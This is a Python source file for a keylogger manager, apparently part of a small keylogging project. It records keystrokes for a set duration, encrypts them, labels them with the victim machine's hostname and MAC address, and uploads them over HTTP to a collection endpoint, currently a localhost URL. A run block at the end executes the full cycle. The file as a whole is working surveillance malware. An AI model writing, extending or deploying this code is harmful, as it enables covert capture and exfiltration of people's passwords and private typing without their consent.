from keyLoggerService import *
from fileWriter import *
from networkWriter import *
from buffer import *
from encryptor import *
from getmac import get_mac_address
import socket

class KeyLoggerManager:

    def __init__(self, buffer_size: int, url: str):
        self.__buffer = Buffer(buffer_size)
        self.__machine_name = {socket.gethostname(): str(get_mac_address())}
        self.__service = KeyLoggerService()
        self.__filewriter = FileWriter()
        self.__networkwriter = NetworkWriter(url)

    def collect_data(self, duration: int) -> None:
        self.__service.start_logging()
        time.sleep(duration)
        self.__service.stop_logging()
        self.__buffer.add_data(" ".join(self.__service.get_logged_keys()))

    def process_data(self):
        data = self.__buffer.get_data()
        data_str = " ".join(data)
        #print(f"Data before encryption: {data_str}")
        encrypted_data1 = Encryptor().encrypt(data_str)
        #print(f"Data after encryption: {encrypted_data1}")
        return encrypted_data1


    def send_data(self, enc_data: str) -> None:
        machine_name = self.__machine_name
        #self.__filewriter.send_data(enc_data, machine_name)
        self.__networkwriter.send_data(enc_data, machine_name)


manager = KeyLoggerManager(200, "http://127.0.0.1:5000/api/upload")
manager.collect_data(12)
data1 = manager.process_data()
manager.send_data(data1)
